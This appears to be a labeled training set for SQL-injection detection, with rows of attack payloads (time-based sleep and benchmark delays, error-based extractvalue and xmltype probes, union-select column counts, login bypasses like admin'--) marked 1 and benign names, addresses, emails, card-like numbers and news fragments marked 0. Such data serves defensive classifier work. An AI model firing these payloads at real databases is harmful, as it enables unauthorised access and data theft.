Query,Label
"1"" )  where 9855 = 9855",1
"1'+ ( select 'qzcx' where 9524 = 9524 and elt ( 3069 = 8430,8430  )  )  +'",1
huaripuma guisasola,0
' )  or true--,1
6538,0
1' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ,1
"-9297 )  union all select 6841,6841,6841,6841,6841--",1
"1'  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
-7242' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'kfff' = 'kfff,1
"1""  )  )   or sleep ( 5 ) #",1
"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""qzzg"" like ""qzzg",1
r54o60a,0
addetia,0
"1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ",1
4431931876895268,0
"com/wp-includes/online-mc, PRODUCT409 PRODUCT409 %EB%B0%95%EC%A3%BC%ED%98%B8 %ED%99%8D%EA%B8%B8%EB%8F%99 %ED%99%8D%EA%B8%B8%EA%B0%80 %ED%99%8D%EA%B8%B8%EB%82%98 %ED%99%8D%EA%B8%B8%EB%8B%A4 %ED%99%8D%EA%B8%B8%EB%9D%BC %ED%99%8D%EA%B8%B8%EB%A7%88 %ED%99%8D%EA%B8%B8%EB%B0%94 %ED%99%8D%EA%B8%B8%EC%82%AC %ED%99%8D%EA%B8%B8%EC%95%84 %ED%99%8D%EA%B8%B8%EC%9E%90 %ED%99%8D%EC%A7%88%EC%B0%A8%ED%99%8D%EC%A7%88%EC%B0%A8 & & =  (주)나빠요하하 ******* ********* ********** *********** ************** *************** +5hIp5/XQSe0q9x4@V$K@xbLIzU9CXs34UqM8@V$K@B9PWaIyA1ZscZc0tdMH@V$K@xbLIzU9CXs34UqM8 -----------------------------7e110e370ece -----------------------------7e115a25c0784 -----------------------------7e1161151f9e -----------------------------7e123d150600 -----------------------------7e12422e2 -----------------------------7e12422e2c090a -----------------------------7e12b2f1e1098 -----------------------------7e12db131 -----------------------------7e12db131f238a -----------------------------7e13482d1 -----------------------------7e13482d1b1020 -----------------------------7e135771c0f0c -----------------------------7e17a8320a4 -----------------------------7e1846d0fba -----------------------------7e196581600 -----------------------------7e1c7582640 ------WebKitFormBoundaryxqnD09MP6AAoISHj ",0
"-1985%'  )  )   )  union all select 3051,3051,3051--",1
"1%'  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  '%' = '",1
 end and   (  (   ( 'hglq' like 'hglq,1
" For long periods , Janson performer stage ",0
"1' )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( 'mevd' = 'mevd",1
80u90i9,0
carapopela,0
dowd,0
ga+vanza,0
" The host old games , wheelbarrow racing walking stilts , promises plenty fun ",0
clint,0
"-5606  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
esser-wrixon5@atorre.se,0
"-9504%""  )  )   or 8098 = 7472",1
" Eye witnesses reported seeing shooter gun one departure lounges , reported several media ",0
"1"" )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
71611234k,0
02660,0
7652411292713718,0
pedemonte@mystyleperfume.th,0
"1"" )  where 1666 = 1666 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
4650446572677289,0
hossana,0
plza. padre juan de mariana 152,0
aracena,0
30840,0
haralamb,0
" select * from users where id = 1 or 1#""@ union select 1,version (  )  -- 1",1
alessandro,0
1%' )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( '%' = ',1
prize@lingote.com.pn,0
oran,0
"1"" where 1537 = 1537 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
"san jorge, 188",0
 judges compromising necessity judge avoid appearance partiality part series media interviews public statements responding publicly criticism court ,0
1'|| ( select 'adni' from dual where 6611 = 6611,1
desabor$ida,0
1' and  ( 5116 = 1602 ) *1602,1
guilbauth iglsia,0
1 )  where 3381 = 3381 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
 He could enter factory wearing hair protection white coat ,0
1 where 3357 = 3357 and  ( 9492 = 4334 ) *4334--,1
"1""  )  )   as eglv where 7412 = 7412 union all select null#",1
"1""  )  )   as vbpl where 3885 = 3885 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --",1
"-7485%'  )  )   )  union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1
9079098959660122,0
putrefa8tiva,0
ademuz,0
1' where 4473 = 4473 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
" Eventually, two segmentations formed according punctuation prediction results, shown Figure 1(c)",0
24930,0
45221,0
4344811902014577,0
"1'  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'qgov' = 'qgov",1
" Next year &apos;s consistory would significant would first since Francis elected March year , Valero said ",0
"-5798"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
v9lenc8an3sm9,0
-4058 )  union all select 9184--,1
b*uba,0
marchard@mailboxrussia.kw,0
ex27mulgar,0
 Mitt Romney presented confusing unrefined alternative could seem lock policies positions ,0
torres de la alameda,0
evangelino,0
etreros 8 13a,0
shemwell,0
"1%'  )  )   or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
"1' in boolean mode )  union all select null,null,null,null,null,null,null,null,null#",1
" On Sunday , Leinstetten Music Society entertain audiences morning session , Böffingen Farmer &apos;s Band guests 2: 00 p",0
" The virus selectively infects liver cells , start make steady stream antibodies ",0
" Salem: Johanna Rahner Ecumenical Discussion Forum At next Ecumenical Discussion Forum Monday 21 October , Neues Museum des Schlosses (New Castle Museum), focus topic &quot; To hell Hell - Theological reflections approach notion end times &quot; ",0
"1"" )  where 4913 = 4913",1
-1436' or 5699 = 5783--,1
 Shortly Schänzle roundabout noticed left-turn lane going direction Stromeyersdorfstraße moved across right lane ,0
-8876'  )  )   or 3038 = 3038,1
5798582876895008,0
7627570556544379,0
"calle muerdago, s/n,",0
 The objective create clear view viewpoint ,0
alcahazar,0
" Psychosocial aspects important , ",0
dantas.pellegrim4@nanotecnologo.kr,0
" &quot; We working assumption increase 1 cent plus x , &quot; said Bias , figure likely closer 2 cents ",0
sant joan de vilatorrada,0
"1, ( cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 7823 = 7823 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric  )  )  ",1
 select * from users where id = 1 <@.$ or 1 = 1 -- 1,1
" Mashed tofu plant cream , example , serves substitute quark cheese ",0
anatoli,0
/**/or/**/1/**/ = /**/1,1
canino,0
09205053q,0
1'|| ( select 'mnvk' from dual where 4181 = 4181,1
weiner,0
siripong,0
opopnaco,0
"1'  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'fowu' like 'fowu",1
"select * from generate_series ( 3267,3267,case when  ( 3267 = 5900 )  then 1 else 0 end )  limit 1--",1
"1'  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'xdui' like 'xdui",1
"1' )  as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
"1"" )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""liar"" = ""liar",1
3055509843252102,0
"-3130'  )  )   )  union all select 2886,2886,2886,2886,2886,2886,2886#",1
"1"" )  where 8462 = 8462 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1
ribera vitols,0
"D , &quot; explains Schulze ",0
"1' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( 'iixp' = 'iixp",1
admin'--,1
"1' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1'|| ( select 'pzoe' where 2977 = 2977 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
kariann,0
"muelle evaristo churruca, 149 5?e",0
pakulski,0
' select * from information_schema.tables--,1
doris,0
"calle bartolome sierra, 115 7h",0
troguet,0
-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,1
1  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  5171 = 5171,1
1'+ ( select iutk where 6158 = 6158,1
 It something people wanted ,0
1' )  and  ( 3020 = 3020 ) *6703 and  ( 'lhfa' = 'lhfa,1
"avda. de la costa 151,",0
"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and 'esjl' = 'esjl",1
-8143 )  union all select 3014--,1
"1""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""oxvw"" = ""oxvw",1
" When became clear much money wasted , decided help Africans controlling budget people ",0
" According The Star newspaper , new bill effectively hand government &quot; stranglehold media , &quot; The Standard said democracy free speech Kenya &quot; dealt major blow &quot; lambasted bill &quot; draconian ",0
irresolucin,0
"-6108' )  union all select 2519,2519,2519,2519--",1
"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4250 = 4250 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ",1
17485,0
"carpio de tajo, el",0
select case when 1892 = 3646 then 1 else null end--,1
"1""  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""quni"" = ""quni",1
"1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( 'gfxr' = 'gfxr",1
5630456632018872,0
" However , several planes could seen taking CNN ",0
masana molera,0
-2055 )  or 3038 = 3038,1
1356891564948898,0
"1""  )  )   as fmul where 7827 = 7827",1
-5982' or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and 'ikuh' = 'ikuh,1
 end and   (  (   ( 'hwrs' like 'hwrs,1
" With three gigantic mirrors , 45 metres tall , centuries-old dream came true Wednesday ",0
kaz@3horas.com,0
sarracn,0
1%' )  rlike sleep ( 5 )  and  ( '%' = ',1
61089610t,0
3483759032039074,0
4162370064639312,0
" Later , sausage salad provided ",0
" He said &quot; serious problems &quot; recruitment , screening , induction , training supervision staff ",0
"villares de soria, los",0
"1%"" )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,1
rascadura,0
-9581 )  as jkqo where 5200 = 5200 or 6872 = 6872--,1
maria-terzon@lingotes.com.org,0
" The 70-minute performance glosses script host director &apos;s additions , well-known repertoire post-dramatic theatrical styles ",0
dailey@flabingo.gw,0
" A report filed European Commission 2011 described intersex people different transsexual transgender people , status gender related instead relates biological makeup , neither exclusively male exclusively female , typical clearly defined either ",0
juifen5,0
" Nevertheless , reconstruction railway crossing consented majority , provision required supporting wall built way town could , required , extend connecting road &quot; Bahnhofstraße &quot; direction around 5",0
d1si0u544a,0
"1""  )  )   as wugz where 5355 = 5355 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1
 The virtue request conformity,0
1' and  ( 3020 = 3020 ) *6703 and 'tmng' like 'tmng,1
" &quot; These investments respond ideas front-line clinicians told best ways tend Tasmania &apos;s health system , &quot; Ms Plibersek said ",0
enconrea7,0
0936495801431480,0
1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ,1
31827013g,0
1es6si47e7t1,0
iair,0
2403,0
sensualmente,0
08573,0
3685717385941815,0
balutis,0
"1'  )  )   )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 'trdf' like 'trdf",1
"1%'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  '%' = '",1
gisela,0
" Taking stage men women smart bowler hats , tipped flat cap jaunty angle paraded two-year-old Toffee around ring ",0
-3978 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) -- mtun,1
898,0
" Authorities seized eight-and-a-half tons marijuana 327 pounds cocaine connection tunnel &apos;s discovery , according court records ",0
1'  )  )   and sleep ( 5 )  and   (  (  'krrr' = 'krrr,1
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) ",1
"1' )  where 1646 = 1646 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
aldeaseca,0
"nuestra seora del perpetuo socorro, 125",0
1 )  where 7729 = 7729,1
1  )  )   as prxq where 4600 = 4600,1
parnesi3,0
mirel-duvitski@pavimentosalagon.sr,0
"1%""  )  )   )  union all select null,null,null--",1
 Cars get many miles gallon ,0
shubaly,0
trinidad,0
t5m3la,0
borracho,0
"1%'  )  )   )  and elt ( 7425 = 3843,3843 )  and   (  (   ( '%' = '",1
castell d'empries,0
" select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1
kurio,0
 I looking new home husband time ,0
tadeas4,0
"1'|| ( select 'scwx' where 6591 = 6591 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) ||'",1
"1"" )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( ""kxws"" like ""kxws",1
c/ pereiras 149,0
samanta,0
9366583302251207,0
 select sleep ( 5 )  and   (  (   ( '%' = ',1
"1 )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( 5621 = 5621",1
cami capellana 34 13?e,0
"1%'  )  )   )  union all select null,null,null,null,null,null--",1
sancho,0
e2i5y,0
16157298m,0
abagael,0
""" or pg_sleep ( __TIME__ ) --",1
"1  )  )   )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
"1'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'jwbt' = 'jwbt",1
"1"" )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
"1' where 7504 = 7504 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
3071574299603363,0
"1'  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'mymg' = 'mymg",1
"-8200' where 3422 = 3422 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
"-8325  )  )   as ajxq where 6630 = 6630 union all select 6630,6630,6630,6630,6630,6630--",1
"1 )  as zmjm where 9125 = 9125 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
"-2246""  )  )   union all select 4613,4613,4613,4613,4613,4613#",1
 The group also recommended heavier devices safely stowed seats overhead bins take-off landing ,0
wayca,0
0n3r3oscura,0
â or 1 = 1 --,1
 end#,1
" Mr Ströbele , MP Germany &apos;s Green party , published picture Mr Snowden Twitter feed ",0
" In June , 52-year-old Australian , Norrie May-Welby , became world &apos;s first recognized &quot; genderless &quot; person winning legal appeal keep &quot; unspecified &quot; gender status life ",0
trisca,0
" select * from users where id = 1 <@<@ union select null,version (  )  -- 1",1
"1"" )  where 3390 = 3390",1
"1%""  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( ""%"" = """,1
50138,0
"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and 'yaje' = 'yaje",1
4141615236089952,0
select  ( case when  ( 3344 = 8103 )  then 3344 else 1/ ( select 0 )  end ) --,1
7482251600785207,0
marye@theroxyblue.mr,0
05248300e,0
1710045357867718,0
 The road remained fully blocked around two hours ,0
salom,0
"1""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
genny,0
-5152'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'jumr' like 'jumr,1
"""  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
"1 )  where 5234 = 5234 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
11039917d,0
9639622169891672,0
 However said heartened worldwide response &quot; act political expression ,0
1 where 6173 = 6173,1
afan2do,0
"1""  )  )   as pqbs where 4409 = 4409",1
4815643958728547,0
"-7939"" )  or 3958 = 6909",1
grijota,0
"-3699%'  )  )   )  union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",1
b3zucar,0
oshea_knowles@tiaherminia.gh,0
1  )  )   ) ,1
"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1
"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1 )  as usnn where 3201 = 3201,1
"1%'  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  '%' = '",1
berges@monsur.pt,0
adelmar,0
"1' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 'uwbh' = 'uwbh",1
r-evu4lo,0
24142,0
"-4705' where 2029 = 2029 union all select 2029,2029,2029#",1
"1', ( select  ( case when  ( 6948 = 4654 )  then 1 else 6948* ( select 6948 from mysql.db )  end  )  )  ",1
"1' )  as uqkz where 8482 = 8482 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
1'+ ( select 'ljtl' where 1766 = 1766,1
midkiff_mikuni@directoriogratuito.kh,0
" When conductor , Bianca Willmann , raised baton 7: 30 p",0
"1'|| ( select 'sned' where 4957 = 4957 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
karpf-valardy@animextremist.lc,0
06131,0
aldunce garbino,0
7714749780417930,0
aforzarse,0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
woodburn@vinavilano.hr,0
"1""  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( ""djwo"" = ""djwo",1
1'  )  )   and 4242 = 5831 and   (  (  'xflh' like 'xflh,1
"1'  )  )   )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 'owot' = 'owot",1
"1%"" )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""%"" = """,1
43143,0
" During interview Australian radio show week , pop star said sang backing vocals Jagger &apos;s 2004 song &quot; Old Habits Die Hard ",0
4702,0
"1'  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'wcmt' = 'wcmt",1
alcntar,0
'; WAITFOR DELAY '0:0:5'--,1
28505,0
"admin"" or 1 = 1#",1
-1492 where 2788 = 2788 union all select 2788#,1
 In September began giving half many frequent flier miles customers bought online travel agency ,0
7730641296571131,0
freiss@turinga.tn,0
"1"" where 7879 = 7879",1
 On happiness dreaming camels Happiness oasis dreaming camels manage reach It piece Bedouin wisdom first ever chairman Wolfgang Henne described history fascination behind &quot; Helping Hands &quot; society ,0
gimnez toneu,0
"1"" )  where 1024 = 1024 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
irizar morata,0
5257931647701652,0
4302979715945309,0
1%' )  waitfor delay '0:0:5' and  ( '%' = ',1
"1""  )  )   as paep where 8947 = 8947 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
carmena,0
 The speaker Johanna Rahner ,0
"avinguda doctor vilaseca, s/n,",0
05130,0
select  ( case when  ( 9556 = 7122 )  then 9556 else 9556* ( select 9556 from information_schema.character_sets )  end ) #,1
27404814s,0
" select * from users where id = 1 union select @ 1a,version (  )  -- 1",1
1'+ ( select kzgg where 5070 = 5070,1
" select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1
" Mr Cook said: &quot; Following increases stamp duty high value homes introduction associated anti-avoidance legislation , difficult argue high value property under-taxed irrespective effect out-dated council tax system ",0
herrera de los navarros,0
stars,0
" &quot; Our ongoing inquiry matter continues co-operating fully FCA regulators , &quot; bank said two weeks ago ",0
4907598174142069,0
tropeano3,0
hassold,0
" select * from users where id = 1 or 1#""@ union select version (  ) ,version (  )  -- 1",1
 District Court Texas ,0
-1459'  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( 'eiet' like 'eiet,1
4970113242543246,0
 The fact Africa lies closer many think means forgotten ,0
2633,0
"-7078'|| ( select 'lcza' where 5076 = 5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",1
asaeteadora,0
"iif ( 6369 = 5881,1,1/0 ) ",1
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""vukd"" = ""vukd",1
1'  )  )   as fcjk where 7755 = 7755,1
"-9180"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
suti8me9te,0
-3582 )  where 5873 = 5873 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
"-4923"" or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and ""afjc"" like ""afjc",1
2774742421964079,0
